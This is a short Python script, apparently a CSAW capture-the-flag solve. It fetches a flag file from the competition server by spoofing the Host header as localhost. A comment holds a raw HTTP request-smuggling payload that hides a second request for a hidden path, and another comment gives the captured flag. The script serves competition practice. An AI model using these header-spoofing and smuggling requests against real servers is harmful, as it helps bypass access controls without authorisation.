import requests


# printf "GET /a HTTP/1.1\r\nHost: localhost\r\nContent-Length: 56\r\n\r\nGET /_hidden/index.html HTTP/1.1\r\nHost: notlocalhost\r\n\r\n"
url = "http://web.csaw.io:3009/flag.txt"

# data={}
data = {
	"Host": "localhost"
}

response = requests.get(url, headers=data)

print("Status Code", response.status_code)
print(response.text)
# print("JSON Response ", response.json())
# csawctf{d0nt_smuggl3_Fla6s_!}